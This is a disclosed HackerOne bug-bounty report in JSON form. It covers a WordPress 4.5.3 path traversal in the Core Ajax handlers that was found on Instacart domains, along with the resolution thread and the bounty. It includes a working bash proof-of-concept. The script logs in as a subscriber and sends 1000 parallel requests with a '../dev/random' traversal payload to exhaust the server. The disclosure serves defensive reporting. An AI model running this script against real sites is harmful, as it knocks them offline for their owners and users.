{"id":163307,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjMzMDc=","url":"https://hackerone.com/reports/163307","title":"WordPress Authentication Denial of Service","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-25T09:31:32.552Z","submitted_at":"2016-08-25T09:31:32.552Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"clizsec","url":"/clizsec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/102/898/e4554cad6e93f2c60c84e911e273f7ba2f35d617_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":555,"url":"https://hackerone.com/instacart","handle":"instacart","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/555/df662b77c791ed1296275d032f446300e1a5a6b3_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/555/df662b77c791ed1296275d032f446300e1a5a6b3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Instacart","twitter_handle":"instacart","website":"https://www.instacart.com/","about":"Same-day grocery delivery"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-05-26T19:36:12.991Z","bug_reporter_agreed_on_going_public_at":"2017-04-26T19:36:08.300Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\nI found out that you are using WordPress version 4.5.3.\n\nResearchers found out 5 days ago, that this version has a vulnerability, a Path traversal in WordPress Core Ajax handlers.\n\n_Intro_\nWordPress is web software that can be used to create a website, blog, or app. A path traversal vulnerability exists in the Core Ajax handlers of the WordPress Admin API. This issue can (potentially) be used by an authenticated user (Subscriber) to create a denial of service condition of an affected WordPress site.\n\n_Description_\nPotentially this issue can be used to disclose information, provided that the target file contains a line with Version:. What is more important that it also allows for a denial of service condition as the logged in attacker can use this flaw to read up to 8 KB of data from /dev/random. Doing this repeatedly will deplete the entropy pool, which causes /dev/random to block; blocking the PHP scripts. Using a very simple script, it is possible for an authenticated user (Subscriber) to bring down a WordPress site. It is also possible to trigger this issue via Cross-Site Request Forgery as the nonce check is done too late in this case.\n\n_PoC Script_\n```\n#!/bin/bash\ntarget=\"http://\u003ctarget\u003e\"\nusername=\"subscriber\"\npassword=\"password\"\ncookiejar=$(mktemp)\n   \n# login\ncurl --cookie-jar \"$cookiejar\" \\\n   --data \"log=$username\u0026pwd=$password\u0026wp-submit=Log+In\u0026redirect_to=%2f\u0026testcookie=1\" \\\n   \"$target/wp-login.php\" \\\n   \u003e/dev/null 2\u003e\u00261\n   \n# exhaust apache\nfor i in `seq 1 1000`\n   do\n      curl --cookie \"$cookiejar\" \\\n      --data \"plugin=../../../../../../../../../../dev/random\u0026action=update-plugin\" \\\n      \"$target/wp-admin/admin-ajax.php\" \\\n      \u003e/dev/null 2\u003e\u00261 \u0026\ndone\n   \nrm \"$cookiejar\"\n```\n\nLink: \n```\nhttps://sumofpwn.nl/advisory/2016/path_traversal_vulnerability_in_wordpress_core_ajax_handlers.html\n```\n\nI hope that I helped you.\n","vulnerability_information_html":"\u003cp\u003eHi,\u003cbr\u003e\nI found out that you are using WordPress version 4.5.3.\u003c/p\u003e\n\n\u003cp\u003eResearchers found out 5 days ago, that this version has a vulnerability, a Path traversal in WordPress Core Ajax handlers.\u003c/p\u003e\n\n\u003cp\u003e\u003cu\u003eIntro\u003c/u\u003e\u003cbr\u003e\nWordPress is web software that can be used to create a website, blog, or app. A path traversal vulnerability exists in the Core Ajax handlers of the WordPress Admin API. This issue can (potentially) be used by an authenticated user (Subscriber) to create a denial of service condition of an affected WordPress site.\u003c/p\u003e\n\n\u003cp\u003e\u003cu\u003eDescription\u003c/u\u003e\u003cbr\u003e\nPotentially this issue can be used to disclose information, provided that the target file contains a line with Version:. What is more important that it also allows for a denial of service condition as the logged in attacker can use this flaw to read up to 8 KB of data from /dev/random. Doing this repeatedly will deplete the entropy pool, which causes /dev/random to block; blocking the PHP scripts. Using a very simple script, it is possible for an authenticated user (Subscriber) to bring down a WordPress site. It is also possible to trigger this issue via Cross-Site Request Forgery as the nonce check is done too late in this case.\u003c/p\u003e\n\n\u003cp\u003e\u003cu\u003ePoC Script\u003c/u\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e#!/bin/bash\u003c/span\u003e\n\u003cspan class=\"nv\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;http://\u0026lt;target\u0026gt;\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;subscriber\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003epassword\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003ecookiejar\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e$(\u003c/span\u003e\u003cspan class=\"nb\"\u003emktemp\u003c/span\u003e\u003cspan class=\"si\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"c\"\u003e# login\u003c/span\u003e\ncurl \u003cspan class=\"nt\"\u003e--cookie-jar\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cookiejar\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n   \u003cspan class=\"nt\"\u003e--data\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;log=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$username\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;pwd=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$password\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=%2f\u0026amp;testcookie=1\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n   \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$target\u003c/span\u003e\u003cspan class=\"s2\"\u003e/wp-login.php\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n   \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e/dev/null 2\u0026gt;\u0026amp;1\n\n\u003cspan class=\"c\"\u003e# exhaust apache\u003c/span\u003e\n\u003cspan class=\"k\"\u003efor \u003c/span\u003ei \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"nb\"\u003eseq \u003c/span\u003e1 1000\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\n   \u003cspan class=\"k\"\u003edo\n      \u003c/span\u003ecurl \u003cspan class=\"nt\"\u003e--cookie\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cookiejar\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e--data\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;plugin=../../../../../../../../../../dev/random\u0026amp;action=update-plugin\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n      \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$target\u003c/span\u003e\u003cspan class=\"s2\"\u003e/wp-admin/admin-ajax.php\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\n\u003cspan class=\"k\"\u003edone\n\n\u003c/span\u003e\u003cspan class=\"nb\"\u003erm\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cookiejar\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLink: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://sumofpwn.nl/advisory/2016/path_traversal_vulnerability_in_wordpress_core_ajax_handlers.html\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI hope that I helped you.\u003c/p\u003e\n","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-05-26T19:36:08.365Z","allow_singular_disclosure_after":-113389293.77701369,"singular_disclosure_allowed":true,"vote_count":6,"voters":["eveeez","exception","clizsec","japz","spetr0x","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1156219,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello @clizsec,\n\nThank you for the report, this should now be fixed, can you confirm?","markdown_message":"\u003cp\u003eHello \u003ca href=\"/clizsec\"\u003e@clizsec\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for the report, this should now be fixed, can you confirm?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-26T17:09:03.905Z","updated_at":"2016-08-26T17:09:03.905Z","actor":{"username":"anf","cleared":false,"url":"/anf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/569/6f3c5a7f7e76bc75a837f2b4ce698afe4e88d5e6_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"clizsec","url":"/clizsec"},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1156356,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Okay,\nHorray!\n\n```\nhttps://careers.instacart.com\n```\n\ndomain is now using WordPress v4.6, the vulnerability fixed here.\n\nBut in the following domains are still vulnerable:\n```\nhttps://news.instacart.com\nhttps://tech.instacart.com\n\n```\nPlease check all of your other domains that are holding WordPress, and upgrade them to the secured version, \nI didn't chechked all your subdomains as I didn't want to flood your servers.\n\nI'm here to help, I can scan for other subdomains if you'll not find any sights of WordPress, thanks!","markdown_message":"\u003cp\u003eOkay,\u003cbr\u003e\nHorray!\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://careers.instacart.com\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003edomain is now using WordPress v4.6, the vulnerability fixed here.\u003c/p\u003e\n\n\u003cp\u003eBut in the following domains are still vulnerable:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://news.instacart.com\nhttps://tech.instacart.com\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePlease check all of your other domains that are holding WordPress, and upgrade them to the secured version, \u003cbr\u003e\nI didn\u0026#39;t chechked all your subdomains as I didn\u0026#39;t want to flood your servers.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m here to help, I can scan for other subdomains if you\u0026#39;ll not find any sights of WordPress, thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-26T18:01:15.527Z","updated_at":"2016-08-26T18:01:15.527Z","actor":{"username":"clizsec","cleared":false,"url":"/clizsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/102/898/e4554cad6e93f2c60c84e911e273f7ba2f35d617_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1157786,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"All of them should now be fixed, thanks for the report!","markdown_message":"\u003cp\u003eAll of them should now be fixed, thanks for the report!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-27T18:19:31.703Z","updated_at":"2016-08-27T18:19:31.703Z","actor":{"url":"/instacart","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/555/df662b77c791ed1296275d032f446300e1a5a6b3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Instacart"}},"bounty_amount":"100.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"instacart","collaborator":{"username":"clizsec","url":"/clizsec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1158158,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That's a great news!\nI'm glad I helped you, thanks!","markdown_message":"\u003cp\u003eThat\u0026#39;s a great news!\u003cbr\u003e\nI\u0026#39;m glad I helped you, thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-28T06:13:00.772Z","updated_at":"2016-08-28T06:13:00.772Z","actor":{"username":"clizsec","cleared":false,"url":"/clizsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/102/898/e4554cad6e93f2c60c84e911e273f7ba2f35d617_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1638513,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-26T19:36:08.330Z","updated_at":"2017-04-26T19:36:08.330Z","first_to_agree":true,"actor":{"username":"clizsec","cleared":false,"url":"/clizsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/102/898/e4554cad6e93f2c60c84e911e273f7ba2f35d617_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1656750,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please disclose it, forgot to mention that. Thanks!","markdown_message":"\u003cp\u003ePlease disclose it, forgot to mention that. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-05T16:28:07.659Z","updated_at":"2017-05-05T16:28:07.659Z","actor":{"username":"clizsec","cleared":false,"url":"/clizsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/102/898/e4554cad6e93f2c60c84e911e273f7ba2f35d617_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1704212,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-26T19:36:13.009Z","updated_at":"2017-05-26T19:36:13.009Z","actor":{"url":"/instacart","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/555/df662b77c791ed1296275d032f446300e1a5a6b3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Instacart"}},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}